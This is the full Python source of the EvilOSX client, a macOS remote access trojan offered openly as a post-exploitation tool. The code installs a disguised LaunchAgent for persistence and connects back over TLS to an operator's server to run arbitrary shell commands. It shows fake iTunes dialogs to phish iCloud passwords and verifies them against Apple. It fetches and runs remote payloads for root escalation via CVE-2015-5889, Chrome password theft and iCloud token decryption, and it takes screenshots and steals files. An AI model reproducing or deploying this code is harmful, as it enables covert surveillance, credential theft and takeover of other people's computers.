#!/usr/bin/env python
# EvilOSX: A pure python, post-exploitation, RAT (Remote Administration Tool) for macOS / OSX.
import socket
import ssl
import os
import subprocess
from threading import Timer
from threading import Thread
import time
import platform
import base64
import json
import urllib2
import struct
from glob import glob

MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"

development = True


def get_itunes_backups():
    response = ""
    backups = glob("/Users/*/Library/Application Support/MobileSync/Backup/*/Info.plist")

    if len(backups) > 0:
        for count, item in enumerate(backups):
            response += MESSAGE_INFO + "Device #{0}:".format(str(count + 1)) + "\n"

            keys = ["Product Name", "Product Version", "Last Backup Date", "Device Name", "Phone Number",
                    "Serial Number", "IMEI", "Target Identifier", "iTunes Version"]

            for key in keys:
                value = execute_command("/usr/libexec/PlistBuddy -c 'Print :\"{0}\"' '{1}'".format(key, item))
                response += "{0}: {1}\n".format(key, value)
    else:
        response += MESSAGE_ATTENTION + "No backups found."
    return response


def icloud_phish(server_socket, email):
    response = ""
    phishing_prompt = "launchctl asuser osascript -e 'tell application \"iTunes\"' -e \"pause\" -e \"end tell\"; " \
                      "osascript -e 'tell app \"iTunes\" to activate' " \
                      "-e 'tell app \"iTunes\" to display dialog \"Error connecting to iTunes. " \
                      "Please verify your password for " + email + \
                      " \"default answer \"\" with icon 1 with hidden answer with title \"iTunes Connection\"'"

    while True:
        # Check to see if the server requested icloud_phish_stop
        try:
            server_socket.settimeout(0.0)  # Timeout recv immediately if no response

            if receive_message(server_socket) == "icloud_phish_stop":
                server_socket.settimeout(None)

                if not response:
                    return "EMPTY"
                else:
                    return response
        except socket.error:  # All good
            pass

        server_socket.settimeout(None)

        output = subprocess.Popen(phishing_prompt, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = output.stdout.read().replace("\n", "")

        if output == "":
            # User has attempted to cancel, trying again...
            pass
        else:
            output = output.replace("button returned:OK, text returned:", "")
            correct_password = False

            try:
                # Verify correct password
                request = urllib2.Request("https://setup.icloud.com/setup/get_account_settings")
                authorization_token = base64.encodestring('{0}:{1}'.format(email, output)).replace("\n", "")

                request.add_header("Authorization", "Basic {0}".format(authorization_token))
                urllib2.urlopen(request)

                correct_password = True
            except Exception as ex:
                # print str(ex)
                if str(ex) == "HTTP Error 409: Conflict":  # 2FA
                    correct_password = True

            if correct_password:
                response += MESSAGE_ATTENTION + "Received correct password \"{0}\"!\n".format(output)
                return response
            else:
                response += MESSAGE_INFO + "User has attempted to use incorrect password \"{0}\"...\n".format(output)


def get_root(server_socket):
    if is_root():
        send_response(server_socket, MESSAGE_ATTENTION + "We are already root!")
    else:
        system_version = str(platform.mac_ver()[0])

        if system_version.startswith("10.9") or system_version.startswith("10.10"):
            # Attempt to get root via CVE-2015-5889
            payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/LPE_10-10-5.py"
            payload_file = "/tmp/LPE_10-10-5.py"

            execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))  # Download exploit

            if "Exploit completed." in execute_command("python {0}".format(payload_file), False):
                # We can now run commands as sudo, move EvilOSX to a root location.
                send_response(server_socket, MESSAGE_INFO + "Exploit completed successfully, reconnecting as root.")

                execute_command("rm -rf {0}".format(payload_file))
                execute_command("sudo mkdir -p {0}".format(get_program_folder(True)))
                execute_command("sudo mkdir -p /Library/LaunchDaemons")

                # Move program file and launch agent to new location.
                execute_command("sudo cp {0} {1}".format(get_launch_agent_file(), get_launch_agent_file(True)))
                execute_command("sudo cp {0} {1}".format(get_program_file(), get_program_file(True)))

                # Point the launch agent to the new EvilOSX file location.
                command = "sudo sed -i '' -e \"s|{0}|{1}|g\" {2}".format(get_program_file(), get_program_file(True), get_launch_agent_file(True))
                execute_command(command)

                execute_command("sudo launchctl load -w {0}".format(get_launch_agent_file(True)))
                kill_client()  # Kill the old non-root client
            else:
                send_response(server_socket, MESSAGE_ATTENTION + "Unknown error while running exploit.")
        else:
            send_response(server_socket, MESSAGE_ATTENTION + "LPE not implemented for this version of macOS / OSX ({0}).\n".format(system_version))


def kill_client(root=False):
    if root:
        execute_command("sudo rm -rf {0}".format(get_launch_agent_file(True)))
        execute_command("sudo rm -rf {0}/".format(get_program_folder(True)))
        execute_command("sudo launchctl remove {0}".format(get_launch_agent_name()))
        os._exit(1)
    else:
        execute_command("rm -rf {0}".format(get_launch_agent_file()))
        execute_command("rm -rf {0}/".format(get_program_folder()))
        execute_command("launchctl remove {0}".format(get_launch_agent_name()))
        os._exit(1)


def is_root():
    if os.getuid() == 0:
        return True
    else:
        return False


def get_program_file(root=False):
    return get_program_folder(root) + "/EvilOSX"


def get_program_folder(root=False):
    if root:
        return "/Library/Containers/.EvilOSX"
    else:
        return os.path.expanduser("~/Library/Containers/.EvilOSX")


def get_launch_agent_file(root=False):
    if root:
        return "/Library/LaunchDaemons/{0}.plist".format(get_launch_agent_name())
    else:
        return os.path.expanduser("~/Library/LaunchAgents/{0}.plist".format(get_launch_agent_name()))


def get_launch_agent_name():
    return "com.apple.EvilOSX"


def get_wifi():
    command = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport \
               -I | grep -w SSID"

    return execute_command(command).split("SSID: ")[1]


def get_external_ip():
    command = "curl --silent https://wtfismyip.com/text"

    return execute_command(command)


def get_computer_name():
    return execute_command("scutil --get LocalHostName").replace("\n", "")


def get_model():
    model_key = execute_command("sysctl hw.model").split(" ")[1]

    if not model_key:
        model_key = "Macintosh"

    model = execute_command("/usr/libexec/PlistBuddy -c 'Print :\"{0}\"' /System/Library/PrivateFrameworks/ServerInformation.framework/Versions/A/Resources/English.lproj/SIMachineAttributes.plist | grep marketingModel".format(model_key))

    return model.split("= ")[1]


def get_help():
    help = ""
    help += "help              -  Show this help menu.\n"
    help += "status            -  Show debug information.\n"
    help += "clients           -  Show a list of clients.\n"
    help += "connect <ID>      -  Connect to the client.\n"
    help += "get_info          -  Show basic information about the client.\n"
    help += "get_root          -  Attempt to get root via local privilege escalation.\n"
    help += "download <path>   -  Downloads the file to the local machine.\n"
    help += "upload <path>     -  Uploads the file to the remote machine.\n"
    help += "chrome_passwords  -  Retrieve Chrome passwords.\n"
    help += "icloud_contacts   -  Retrieve iCloud contacts.\n"
    help += "icloud_phish      -  Attempt to get iCloud password via phishing.\n"
    help += "itunes_backups    -  Show the user's local iOS backups.\n"
    help += "find_my_iphone    -  Retrieve find my iphone devices.\n"
    help += "screenshot        -  Takes a screenshot of the client.\n"
    help += "kill_client       -  Brutally kill the client (removes the server).\n"
    help += "exit              -  Exits the session.\n"
    help += "Any other command will be executed on the connected client."
    return help


def send_response(server_socket, message):
    # Prefix each message with a 4-byte length (network byte order)
    prefixed_message = struct.pack('>I', len(message)) + message
    server_socket.sendall(prefixed_message)


def receive_message(server_socket):
    # Read message length and unpack it into an integer
    message_length = receive_all(server_socket, 4)

    if not message_length:
        return None

    msglen = struct.unpack('>I', message_length)[0]

    # Read the message data
    return receive_all(server_socket, msglen)


def receive_all(server_socket, message_length):
    """Helper function to receive message_length bytes or return None if EOF is hit."""
    data = ''
    while len(data) < message_length:
        packet = server_socket.recv(message_length - len(data))
        if not packet:
            return None
        data += packet
    return data


def execute_command(command, cleanup=True):
    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()

    if cleanup:
        return output.replace("\n", "")
    else:
        return output


def setup_persistence():
    # Create directories
    execute_command("mkdir -p ~/Library/LaunchAgents/")
    execute_command("mkdir -p {0}".format(get_program_folder()))

    # Create launch agent
    print MESSAGE_INFO + "Creating launch agent..."

    launch_agent_create = '''\
    <?xml version="1.0" encoding="UTF-8"?>
    <plist version="1.0">
       <dict>
          <key>Label</key>
          <string>{0}</string>
          <key>ProgramArguments</key>
          <array>
             <string>{1}</string>
          </array>
          <key>StartInterval</key>
          <integer>5</integer>
       </dict>
    </plist>
    '''.format(get_launch_agent_name(), get_program_file())

    with open(get_launch_agent_file(), 'wb') as content:
        content.write(launch_agent_create)

    # Move EvilOSX
    print MESSAGE_INFO + "Moving EvilOSX..."

    if development:
        with open(__file__, 'rb') as content:
            with open(get_program_file(), 'wb') as binary:
                binary.write(content.read())
    else:
        os.rename(__file__, get_program_file())
    os.chmod(get_program_file(), 0777)

    # Load launch agent
    print MESSAGE_INFO + "Loading launch agent..."
    out = subprocess.Popen("launchctl load -w {0}".format(get_launch_agent_file()), shell=True, stderr=subprocess.PIPE).stderr.read()

    if out == '':
        if execute_command("launchctl list | grep -w {0}".format(get_launch_agent_name())):
            print MESSAGE_INFO + "Done!"
            exit()
        else:
            print MESSAGE_ATTENTION + "Failed to load launch agent."
            pass
    elif "already loaded" in out.lower():
        print MESSAGE_ATTENTION + "EvilOSX is already loaded."
        exit()
    else:
        print MESSAGE_ATTENTION + "Unexpected output: " + out
        pass


class KeepAlive(Thread):
    def __init__(self, server_socket):
        Thread.__init__(self)

        self.server_socket = server_socket

    def run(self):
        time.sleep(5)
        print MESSAGE_INFO + "Started keep alive thread."

        while True:
            try:
                # Eventually makes the main loop throw socket.error if the connection times out.
                # Needed because otherwise the client will hang on receive_message.
                send_response(self.server_socket, "ping")
                time.sleep(60)
            except Exception as ex:
                break


def start_server():
    print MESSAGE_INFO + "Starting EvilOSX..."

    if is_root():
        os.chdir("/")
    else:
        os.chdir(os.path.expanduser("~"))

    while True:
        # Connect to server.
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(None)

        server_socket = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1, cert_reqs=ssl.CERT_NONE)

        try:
            print MESSAGE_INFO + "Connecting..."
            server_socket.connect((SERVER_HOST, SERVER_PORT))
            print MESSAGE_INFO + "Connected."

            KeepAlive(server_socket).start()
        except socket.error as error:
            if error.errno == 61:
                print MESSAGE_ATTENTION + "Connection refused."
                pass
            else:
                print MESSAGE_ATTENTION + "Failed to connect: {0}".format(error.strerror)
                pass
            time.sleep(5)
            continue

        while True:
            try:
                command = receive_message(server_socket)

                if not command:
                    print MESSAGE_ATTENTION + "Server disconnected."
                    break  # Start listening again (goes to previous while loop).

                print MESSAGE_INFO + "Received command: " + command

                if command == "help":
                    send_response(server_socket, get_help())
                elif command == "get_computer_name":
                    send_response(server_socket, get_computer_name())
                elif command == "get_shell_info":
                    shell_info = execute_command("whoami") + "\t" + get_computer_name() + "\t" + execute_command("pwd")

                    send_response(server_socket, shell_info)
                elif command == "get_info":
                    system_version = str(platform.mac_ver()[0])
                    battery = execute_command("pmset -g batt").split('\t')[1].split(";")
                    filevault = execute_command("fdesetup status")

                    response = MESSAGE_INFO + "System version: " + system_version + "\n"
                    response += MESSAGE_INFO + "Model: " + get_model() + "\n"
                    response += MESSAGE_INFO + "Battery: " + battery[0] + battery[1] + ".\n"
                    response += MESSAGE_INFO + "WiFi network: " + get_wifi() + " (" + get_external_ip() + ")\n"
                    response += MESSAGE_INFO + "Shell location: " + __file__ + "\n"
                    if is_root():
                        response += MESSAGE_INFO + "We are root!\n"
                    else:
                        response += MESSAGE_ATTENTION + "We are not root, see \"get_root\" for local privilege escalation.\n"
                    if "On" in filevault:
                        response += MESSAGE_ATTENTION + "FileVault is on.\n"
                    else:
                        response += MESSAGE_INFO + "FileVault is off."

                    send_response(server_socket, response)
                elif command.startswith("download"):
                    file_path = command.split(" ")[1]

                    if not os.path.isfile(file_path):
                        send_response(server_socket, MESSAGE_ATTENTION + "Failed to download: File doesn't exist!")
                    else:
                        with open(os.path.realpath(file_path), "r") as open_file:
                            encoded_file = base64.b64encode(open_file.read())

                            if not encoded_file:
                                send_response(server_socket, MESSAGE_ATTENTION + "Failed to download: Empty file.")
                            else:
                                send_response(server_socket, encoded_file)
                elif command.startswith("upload"):
                    file_name = command.split(" ")[1]
                    encoded_file = command.split(" ")[2]

                    with open(file_name, "wb") as open_file:
                        open_file.write(base64.b64decode(encoded_file))

                        send_response(server_socket, MESSAGE_INFO + "File uploaded to: " + os.getcwd() + "/" + file_name)
                elif command == "chrome_passwords":
                    payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/chrome_passwords.py"
                    payload_file = "/tmp/chrome_passwords.py"

                    execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))
                    output = execute_command("python {0}".format(payload_file), False)

                    if "Error" in output:
                        if "clicked deny" in output:
                            send_response(server_socket, MESSAGE_ATTENTION + "Failed to get chrome passwords, user clicked deny.")
                        elif "entry not found":
                            send_response(server_socket, MESSAGE_ATTENTION + "Failed to get chrome passwords, Chrome not found.")
                        else:
                            send_response(server_socket, MESSAGE_ATTENTION + "Failed to get chrome passwords, unknown error.")
                    else:
                        send_response(server_socket, output)

                    execute_command("rm -rf {0}".format(payload_file))
                elif command == "decrypt_mme":
                    payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/MMeDecrypt.py"
                    payload_file = "/tmp/MMeDecrypt.py"

                    execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))
                    output = execute_command("python {0}".format(payload_file), False)

                    if "Failed to get iCloud" in output:
                        send_response(server_socket, MESSAGE_ATTENTION + "Failed to get iCloud Decryption Key (user clicked deny).")
                    elif "Failed to find" in output:
                        send_response(server_socket, MESSAGE_ATTENTION + "Failed to find MMeToken file.")
                    else:
                        # Decrypted successfully, store tokens in tokens.json
                        with open(get_program_folder(is_root()) + "/tokens.json", "w") as open_file:
                            open_file.write(output)

                        send_response(server_socket, MESSAGE_INFO + "Decrypted successfully.")

                    execute_command("rm -rf {0}".format(payload_file))
                elif command == "icloud_contacts":
                    if not os.path.isfile(get_program_folder(is_root()) + "/tokens.json"):
                        # The server should handle this message and then call "decrypt_mme".
                        send_response(server_socket, MESSAGE_ATTENTION + "Failed to find tokens.json")
                    else:
                        payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/icloud_contacts.py"
                        payload_file = "/tmp/icloud_contacts.py"

                        execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))

                        with open(get_program_folder(is_root()) + "/tokens.json") as open_file:
                            response = ""

                            for key, value in json.load(open_file).items():
                                dsid = value["dsPrsID"]
                                token = value["mmeAuthToken"]

                                output = execute_command("python {0} {1} {2}".format(payload_file, dsid, token), False)

                                response += MESSAGE_INFO + "Contacts for \"{0}\":\n".format(key)
                                response += output

                            send_response(server_socket, response)

                        execute_command("rm -rf {0}".format(payload_file))
                elif command.startswith("icloud_phish"):
                    email = command.replace("icloud_phish ", "")
                    output = icloud_phish(server_socket, email)

                    send_response(server_socket, output)
                elif command == "itunes_backups":
                    send_response(server_socket, get_itunes_backups())
                elif command.startswith("find_my_iphone"):
                    email = command.split(" ")[1]
                    password = command.split(" ")[2]

                    payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/7841226b942a1b3a5e12007210f4e49ae962c1aa/Payloads/find_my_iphone.py"
                    payload_file = "/tmp/find_my_iphone.py"

                    execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))
                    output = execute_command("python {0} {1} {2}".format(payload_file, email, password), False)

                    send_response(server_socket, output)
                    execute_command("rm -rf {0}".format(payload_file))
                elif command == "screenshot":
                    screenshot_file = "/tmp/screenshot.jpg"

                    execute_command("screencapture -x {0}".format(screenshot_file))

                    with open(screenshot_file, "rb") as open_file:
                        send_response(server_socket, base64.b64encode(open_file.read()))

                    execute_command("rm -rf {0}".format(screenshot_file))
                elif command == "kill_client":
                    send_response(server_socket, "Farewell.")
                    kill_client(is_root())
                elif command == "get_root":
                    get_root(server_socket)
                else:
                    # Regular shell command
                    if len(command) > 3 and command[0:3] == "cd ":
                        try:
                            os.chdir(os.path.expanduser(command[3:]))
                            send_response(server_socket, "EMPTY")
                        except Exception:
                            send_response(server_socket, "EMPTY")
                            pass
                    else:
                        try:
                            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                            timer = Timer(5, lambda process: process.kill(), [process])

                            try:
                                timer.start()  # Kill process after 5 seconds
                                stdout, stderr = process.communicate()
                                response = stdout + stderr

                                if not response:
                                    send_response(server_socket, "EMPTY")
                                else:
                                    send_response(server_socket, response)
                            finally:
                                timer.cancel()
                        except socket.error:
                            print MESSAGE_ATTENTION + "Server disconnected, broken pipe."
                        except Exception as ex:
                            send_response(server_socket, MESSAGE_ATTENTION + str(ex))
            except socket.error as ex:
                print MESSAGE_ATTENTION + str(ex)
            except Exception as ex:
                send_response(server_socket, MESSAGE_ATTENTION + str(ex))
                continue

        try:
            server_socket.close()
        except Exception:
            pass


if os.path.dirname(os.path.realpath(__file__)).lower() != get_program_folder().lower() and not is_root():
    # Comment setup_persistence for debugging
    setup_persistence()

#########################
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 1337
#########################

if __name__ == '__main__':
    start_server()
